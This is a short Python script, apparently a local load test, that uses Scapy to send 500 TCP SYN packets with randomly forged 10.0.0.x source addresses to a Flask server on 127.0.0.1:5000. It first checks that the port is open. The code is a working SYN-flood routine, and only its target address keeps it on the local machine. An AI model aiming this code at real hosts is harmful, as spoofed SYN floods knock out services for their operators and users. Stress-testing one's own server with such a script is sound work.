from scapy.all import *
from random import randint
import time
import socket

target_ip = "127.0.0.1"  # Target IP
target_port = 5000  # Target port
flask_server_url = f"http://{target_ip}:{target_port}"


def syn_flood_test(count=100, delay=0.01):

    print(f"[*] Start SYN Flood (Target: {target_ip}:{target_port})")

    for i in range(count):
        # Randomly generate source IP and port (simulate forged IP)
        src_ip = f"10.0.0.{randint(1, 254)}"
        src_port = randint(1024, 65535)

        # Create TCP SYN packets
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S")
        packet = ip_layer / tcp_layer

        send(packet, verbose=0)  # send data packets
        if i % 10 == 0:
            print(f"Send {i + 1} SYN packets", end="\r")
        time.sleep(delay)  # Avoid instantaneous excessive flow

    print(f"\n[+] test finish, {count} SYN packets send")


def check_server_alive(ip, port, timeout=2):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.close()
        return True
    except:
        return False

if __name__ == "__main__":

    if check_server_alive(target_ip, target_port):
        print("[*] The Flask server port is open and the simulation of SYN Flood begins...")
        syn_flood_test(count=500, delay=0.01)
    else:
        print(f"[!] Error: cannot connect to {target_ip}:{target_port}")
